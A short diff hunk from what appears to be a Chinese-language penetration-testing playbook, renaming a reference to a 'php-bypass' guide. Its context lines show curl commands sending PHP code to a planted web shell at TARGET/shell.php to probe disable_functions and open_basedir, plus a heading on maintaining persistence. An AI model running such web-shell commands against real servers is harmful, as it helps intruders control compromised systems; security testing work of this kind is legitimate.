@@ -180,7 +180,7 @@ curl -s -d "c=echo ini_get('disable_functions');" http://TARGET/shell.php
 # 检查 open_basedir
 curl -s -d "c=echo ini_get('open_basedir');" http://TARGET/shell.php
 
-# 如果有限制 → 参考 php-bypass skill 的 Phase 1/Phase 2 执行绕过
+# 如果有限制 → 参考 php-bypass document 的 Phase 1/Phase 2 执行绕过
 ```
 
 ## Phase 4: 权限维持
